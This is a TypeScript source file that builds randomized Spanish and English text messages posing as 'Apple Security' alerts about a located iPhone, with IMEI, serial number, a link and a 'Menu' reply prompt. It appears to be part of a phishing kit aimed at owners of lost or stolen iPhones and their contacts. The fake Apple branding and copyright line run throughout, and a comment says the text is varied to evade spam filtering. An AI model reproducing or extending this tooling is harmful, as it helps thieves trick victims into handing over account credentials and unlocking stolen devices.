
// Utilidad para generar mensajes aleatorios y evitar spam
export const generateRandomMessage = (process: any, language: 'spanish' | 'english', battery: number, delayedTime: Date, formatDate: (date: Date, lang: string) => string, formatTime: (date: Date) => string) => {
  const random = (arr: any[]) => arr[Math.floor(Math.random() * arr.length)];
  
  if (language === 'spanish') {
    if (process.contact_type === 'propietario') {
      // Variaciones para mensajes al propietario en español
      const openings = [
        "🔐 Notificación de Seguridad de Apple",
        "🛡️ Alert de Seguridad Apple",
        "🔒 Sistema de Seguridad Apple",
        "⚡ Notificación Automática Apple",
        "🔔 Alerta de Dispositivo Apple"
      ];
      
      const detectionPhrases = [
        `🔍 Tu iPhone fue detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras haberse conectado a internet.`,
        `📡 Hemos localizado tu iPhone el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** cuando se conectó a la red.`,
        `🌐 Tu dispositivo fue rastreado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** al conectarse online.`,
        `📍 Ubicación detectada el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras activación de internet.`,
        `🔎 Tu iPhone apareció en línea el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.`
      ];
      
      const statusPhrases = [
        "💡 Esto indica que el dispositivo **está activo y ha sido localizado con éxito**.",
        "✅ El equipo **se encuentra operativo y fue rastreado exitosamente**.",
        "🎯 Confirmamos que el dispositivo **está funcionando y ubicado correctamente**.",
        "⚡ El iPhone **permanece activo y su localización es precisa**.",
        "🔋 Tu equipo **está en línea y ha sido detectado satisfactoriamente**."
      ];
      
      const messagePhrases = [
        "📌 Mensaje automático enviado como **aviso prioritario al número registrado**.",
        "🚨 Notificación automática dirigida a **tu contacto principal verificado**.",
        "📢 Alert generado automáticamente para **el teléfono asociado a tu cuenta**.",
        "⚠️ Comunicación automática enviada a **tu número de seguridad registrado**.",
        "📱 Mensaje del sistema enviado a **tu contacto de emergencia principal**."
      ];
      
      const deviceSections = [
        `👤 Propietario: ${process.owner_name || 'No especificado'}
📱 Modelo: ${process.iphone_model}
🎨 Color: ${process.color}
💾 Almacenamiento: ${process.storage}
📟 IMEI: ${process.imei}
🔑 Número de serie: ${process.serial_number}
🔋 Batería: ${battery}%`,
        
        `👤 Usuario: ${process.owner_name || 'No especificado'}
📱 Dispositivo: ${process.iphone_model}
🌈 Color: ${process.color}
💽 Capacidad: ${process.storage}
🔢 IMEI: ${process.imei}
🆔 Serie: ${process.serial_number}
⚡ Nivel batería: ${battery}%`,
        
        `👤 Titular: ${process.owner_name || 'No especificado'}
📱 iPhone: ${process.iphone_model}
🎨 Coloración: ${process.color}
💾 Memoria: ${process.storage}
📟 Código IMEI: ${process.imei}
🔑 No. Serie: ${process.serial_number}
🔋 Carga: ${battery}%`
      ];
      
      const helpPhrases = [
        "📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧",
        "💬 ¿Necesitas asistencia? 👉 *Escribe* **Menú** para contactar con nuestro soporte especializado 👨‍💻",
        "🆘 ¿Requieres ayuda? 👉 *Envía* **Menú** para obtener asistencia técnica inmediata 🔧",
        "📞 ¿Buscas soporte? 👉 *Responde* **Menú** para conectar con nuestro equipo técnico 👨‍🔧",
        "🛠️ ¿Necesitas apoyo? 👉 *Contesta* **Menú** para recibir asistencia profesional 👩‍💻"
      ];
      
      const closings = [
        "🛡️ Apple Security – Servicio activo 24/7\n©️ 2025 Apple Inc.",
        "🔒 Apple Security – Sistema operativo 24/7\n©️ 2025 Apple Inc.",
        "⚡ Apple Security – Monitoreo continuo\n©️ 2025 Apple Inc.",
        "🌐 Apple Security – Protección 24 horas\n©️ 2025 Apple Inc.",
        "🔐 Apple Security – Vigilancia permanente\n©️ 2025 Apple Inc."
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}
${random(statusPhrases)}

${random(messagePhrases)}

${random(deviceSections)}

${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}

${random(helpPhrases)}

${random(closings)}`;
      
    } else {
      // Variaciones para contacto de emergencia en español
      const openings = [
        "🔐 Notificación de Seguridad de Apple",
        "🛡️ Alert de Emergencia Apple",
        "🚨 Sistema de Alerta Apple",
        "⚠️ Notificación Automática Apple",
        "🔔 Alerta de Contacto de Emergencia"
      ];
      
      const detectionPhrases = [
        `📱 El iPhone de **${process.owner_name || 'usuario registrado'}** ha sido detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.`,
        `📍 Hemos localizado el dispositivo de **${process.owner_name || 'usuario registrado'}** el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.`,
        `🔍 El iPhone perteneciente a **${process.owner_name || 'usuario registrado'}** fue rastreado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.`,
        `🌐 Detectamos el equipo de **${process.owner_name || 'usuario registrado'}** el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.`
      ];
      
      const emergencyPhrases = [
        "⚠️ **Mensaje automático enviado a contactos de emergencia registrados**",
        "🚨 **Notificación automática dirigida a contactos de seguridad**",
        "📢 **Alert generado para contactos de emergencia verificados**",
        "⚡ **Comunicación automática a red de contactos de emergencia**"
      ];
      
      const deviceSections = [
        `🔍 **Estado del dispositivo:**
📱 Modelo: ${process.iphone_model}
🎨 Color: ${process.color}
💾 Almacenamiento: ${process.storage}
📟 IMEI: ${process.imei}
🔑 Serie: ${process.serial_number}
🔋 Batería: ${battery}%`,
        
        `📋 **Información del equipo:**
📱 iPhone: ${process.iphone_model}
🌈 Coloración: ${process.color}
💽 Capacidad: ${process.storage}
🔢 Código IMEI: ${process.imei}
🆔 No. Serie: ${process.serial_number}
⚡ Nivel batería: ${battery}%`
      ];
      
      const contactPhrases = [
        `👨‍👩‍👧‍👦 **Eres un contacto de emergencia de ${process.owner_name || 'este dispositivo'}**`,
        `🆘 **Formas parte de la red de emergencia de ${process.owner_name || 'este usuario'}**`,
        `👥 **Has sido designado como contacto de seguridad de ${process.owner_name || 'este dispositivo'}**`,
        `🔗 **Estás registrado como contacto de emergencia de ${process.owner_name || 'este equipo'}**`
      ];
      
      const instructionPhrases = [
        "📝 **IMPORTANTE**: Por favor, informa al propietario que su equipo ya fue localizado.",
        "⚠️ **ACCIÓN REQUERIDA**: Notifica al dueño que su dispositivo ha sido encontrado.",
        "📞 **AVISO URGENTE**: Comunica al propietario que su iPhone fue detectado.",
        "🔔 **NOTIFICACIÓN**: Informa al titular que su equipo está localizado."
      ];
      
      const helpPhrases = [
        "📬 Para asistencia inmediata 👉 *Responde* **Menú**",
        "💬 Para soporte técnico 👉 *Escribe* **Menú**",
        "🆘 Para ayuda especializada 👉 *Envía* **Menú**",
        "📞 Para contactar soporte 👉 *Contesta* **Menú**"
      ];
      
      const closings = [
        "🛡️ Apple Security – Sistema de emergencia\n©️ 2025 Apple Inc.",
        "🚨 Apple Security – Red de emergencia\n©️ 2025 Apple Inc.",
        "⚡ Apple Security – Protocolo de emergencia\n©️ 2025 Apple Inc.",
        "🔐 Apple Security – Sistema de alerta\n©️ 2025 Apple Inc."
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(emergencyPhrases)}

${random(deviceSections)}

${process.url ? `🌍 Ver ubicación en tiempo real: ${process.url}` : ''}

${random(contactPhrases)}

${random(instructionPhrases)}

${random(helpPhrases)}

${random(closings)}`;
    }
  } else {
    // Mensajes en inglés con variaciones similares
    if (process.contact_type === 'propietario') {
      const openings = [
        "🔐 Apple Security Notification",
        "🛡️ Apple Security Alert",
        "🔒 Apple Security System",
        "⚡ Apple Automatic Notification",
        "🔔 Apple Device Alert"
      ];
      
      const detectionPhrases = [
        `🔍 Your iPhone was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after connecting to the internet.`,
        `📡 We located your iPhone on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** when it connected to the network.`,
        `🌐 Your device was tracked on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** upon online connection.`,
        `📍 Location detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after internet activation.`,
        `🔎 Your iPhone appeared online on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.`
      ];
      
      const statusPhrases = [
        "💡 This indicates that the device **is active and has been successfully located**.",
        "✅ The device **is operational and was tracked successfully**.",
        "🎯 We confirm that the device **is functioning and correctly located**.",
        "⚡ The iPhone **remains active and its location is accurate**.",
        "🔋 Your device **is online and has been detected satisfactorily**."
      ];
      
      const messagePhrases = [
        "📌 Automatic message sent as a **priority notice to the registered number**.",
        "🚨 Automatic notification directed to **your verified primary contact**.",
        "📢 Alert automatically generated for **the phone associated with your account**.",
        "⚠️ Automatic communication sent to **your registered security number**.",
        "📱 System message sent to **your primary emergency contact**."
      ];
      
      const deviceSections = [
        `👤 Owner: ${process.owner_name || 'Not specified'}
📱 Model: ${process.iphone_model}
🎨 Color: ${process.color}
💾 Storage: ${process.storage}
📟 IMEI: ${process.imei}
🔑 Serial number: ${process.serial_number}
🔋 Battery: ${battery}%`,
        
        `👤 User: ${process.owner_name || 'Not specified'}
📱 Device: ${process.iphone_model}
🌈 Color: ${process.color}
💽 Capacity: ${process.storage}
🔢 IMEI: ${process.imei}
🆔 Serial: ${process.serial_number}
⚡ Battery level: ${battery}%`
      ];
      
      const helpPhrases = [
        "📬 Are you the owner? 👉 *Reply with* **Menu** to receive immediate help from technical support team 👨🏽‍🔧",
        "💬 Need assistance? 👉 *Write* **Menu** to contact our specialized support 👨‍💻",
        "🆘 Require help? 👉 *Send* **Menu** to get immediate technical assistance 🔧",
        "📞 Looking for support? 👉 *Reply* **Menu** to connect with our technical team 👨‍🔧"
      ];
      
      const closings = [
        "🛡️ Apple Security – 24/7 active service\n©️ 2025 Apple Inc.",
        "🔒 Apple Security – 24/7 operational system\n©️ 2025 Apple Inc.",
        "⚡ Apple Security – Continuous monitoring\n©️ 2025 Apple Inc.",
        "🌐 Apple Security – 24-hour protection\n©️ 2025 Apple Inc."
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}
${random(statusPhrases)}

${random(messagePhrases)}

${random(deviceSections)}

${process.url ? `🌍 View device status: ${process.url}` : ''}

${random(helpPhrases)}

${random(closings)}`;
      
    } else {
      // Emergency contact message in English
      const openings = [
        "🔐 Apple Security Notification",
        "🛡️ Apple Emergency Alert",
        "🚨 Apple Alert System",
        "⚠️ Apple Automatic Notification",
        "🔔 Apple Emergency Contact Alert"
      ];
      
      const detectionPhrases = [
        `📱 The iPhone belonging to **${process.owner_name || 'registered user'}** was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.`,
        `📍 We located the device belonging to **${process.owner_name || 'registered user'}** on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.`,
        `🔍 The iPhone owned by **${process.owner_name || 'registered user'}** was tracked on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.`
      ];
      
      const emergencyPhrases = [
        "⚠️ **Automatic message sent to registered emergency contacts**",
        "🚨 **Automatic notification directed to security contacts**",
        "📢 **Alert generated for verified emergency contacts**",
        "⚡ **Automatic communication to emergency contact network**"
      ];
      
      const deviceSections = [
        `🔍 **Device status:**
📱 Model: ${process.iphone_model}
🎨 Color: ${process.color}
💾 Storage: ${process.storage}
📟 IMEI: ${process.imei}
🔑 Serial: ${process.serial_number}
🔋 Battery: ${battery}%`,
        
        `📋 **Device information:**
📱 iPhone: ${process.iphone_model}
🌈 Color: ${process.color}
💽 Capacity: ${process.storage}
🔢 IMEI Code: ${process.imei}
🆔 Serial No.: ${process.serial_number}
⚡ Battery level: ${battery}%`
      ];
      
      const contactPhrases = [
        `👨‍👩‍👧‍👦 **You are an emergency contact for ${process.owner_name || 'this device'}**`,
        `🆘 **You are part of the emergency network for ${process.owner_name || 'this user'}**`,
        `👥 **You have been designated as a security contact for ${process.owner_name || 'this device'}**`
      ];
      
      const instructionPhrases = [
        "📝 **IMPORTANT**: Please inform the owner that their device has been located.",
        "⚠️ **ACTION REQUIRED**: Notify the owner that their device has been found.",
        "📞 **URGENT NOTICE**: Communicate to the owner that their iPhone was detected."
      ];
      
      const helpPhrases = [
        "📬 For immediate assistance 👉 *Reply* **Menu**",
        "💬 For technical support 👉 *Write* **Menu**",
        "🆘 For specialized help 👉 *Send* **Menu**"
      ];
      
      const closings = [
        "🛡️ Apple Security – Emergency system\n©️ 2025 Apple Inc.",
        "🚨 Apple Security – Emergency network\n©️ 2025 Apple Inc.",
        "⚡ Apple Security – Emergency protocol\n©️ 2025 Apple Inc."
      ];
      
      return `${random(openings)}

${random(detectionPhrases)}

${random(emergencyPhrases)}

${random(deviceSections)}

${process.url ? `🌍 View real-time location: ${process.url}` : ''}

${random(contactPhrases)}

${random(instructionPhrases)}

${random(helpPhrases)}

${random(closings)}`;
    }
  }
};
